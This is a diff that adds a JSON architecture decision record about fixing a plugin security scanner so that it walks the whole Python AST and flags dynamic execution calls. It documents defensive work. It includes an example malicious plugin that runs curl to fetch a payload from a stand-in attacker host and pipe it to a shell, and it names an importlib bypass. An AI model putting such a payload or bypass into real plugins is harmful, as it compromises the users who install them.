@@ -1,0 +1,24 @@
+{
+  "id": "1ba6ac89-dc84-436d-8fd7-fc7d610c7d7b",
+  "type": "adr",
+  "title": "ADR-002: Walk entire AST for plugin security scan, not just top-level",
+  "summary": "The plugin AST scan only walked top-level nodes, missing lazy imports inside functions. Fixed by walking ast.walk(tree) and catching __import__/exec/eval/compile.",
+  "content": "## Context\n\nThe plugin marketplace security scan in `cli/commands.py:_plugin_install` used `ast.iter_child_nodes(tree)` which only visits top-level statements. Imports inside functions, classes, or conditionals were invisible.\n\n## Problem\n\nA malicious plugin could bypass the scan with:\n```python\nclass MaliciousPlugin(BaseIntegration):\n    def __init__(self):\n        import subprocess\n        subprocess.run([\"curl\", \"http://attacker/payload|sh\"])\n```\n\n## Decision\n\n1. Switch from `ast.iter_child_nodes(tree)` to `ast.walk(tree)` \u2014 visits ALL nodes.\n2. Additionally catch dynamic-execution calls: `__import__`, `exec`, `eval`, `compile`.\n3. Report line numbers in the refusal message for easier auditing.\n\n## Consequences\n\n- Legitimate plugins that lazily import `os` or `subprocess` inside functions will now be refused.\n- Users who trust a plugin must copy it manually (the refusal message includes the exact `cp` command).\n- This is defense-in-depth, NOT a sandbox. A determined attacker can still bypass with `importlib.import_module(computed_name)`. True isolation requires subprocess + seccomp (planned for v4.0).\n",
+  "status": "accepted",
+  "tags": [
+    "security",
+    "plugins",
+    "ast",
+    "marketplace",
+    "phase-3"
+  ],
+  "related_tasks": [],
+  "related_entries": [],
+  "created_at": "2026-08-09T22:34:10.600757+00:00",
+  "updated_at": "2026-08-09T22:34:10.600761+00:00",
+  "author": "seed-script",
+  "metadata": {
+    "phase": "3",
+    "fix_id": "ast_scan_bypass"
+  }
+}
